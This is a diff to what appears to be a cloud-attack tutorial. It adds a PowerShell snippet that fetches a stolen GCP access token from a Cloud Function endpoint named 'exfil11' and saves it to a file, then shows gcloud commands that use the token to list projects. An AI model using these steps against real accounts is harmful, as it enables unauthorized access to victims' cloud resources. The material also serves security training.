@@ -582,15 +582,18 @@ These are the permissions required for the overall task:
 
 With the access to the *access_token* what can we do? Well, a lot. One being authenticating and accessing various GCP APIs, services and resources, such as Google Cloud Storage, Google Cloud Compute Engine, and Google Kubernetes Engine etc. Here's an argument (--access-token-file) you can use with gCloud after you've gotten access to the *access_token*. Put the *access_token* in a file and specify it with the argument '--access-token-file' with gcloud. The *access_token* will allow you to perform actions and access resources in GCP as the user or service account associated with the token. 
 
-Below is a Powershell Command that will 
+Below is a Powershell Command that will put the the *access_token* into a txt file, to be used later with gCloud.
+
 ```powershell
 $response = Invoke-WebRequest -Uri "https://us-east1-nnnn-374620.cloudfunctions.net/exfil11" -UseBasicParsing
 $jsonResponse = $response | ConvertFrom-Json
 $accessToken = $jsonResponse.access_token
 $accessToken | Out-File -FilePath "code.txt"
 ```
-Example Usage: gCloud command with "--access-token-file"
+Let's use the *access_token*.
+
 ```shell
+Example Usage:
 gcloud projects list --access-token-file=code.txt
 gcloud projects list --access-token-file=C:\Users\Administrator\code.txt
 ```
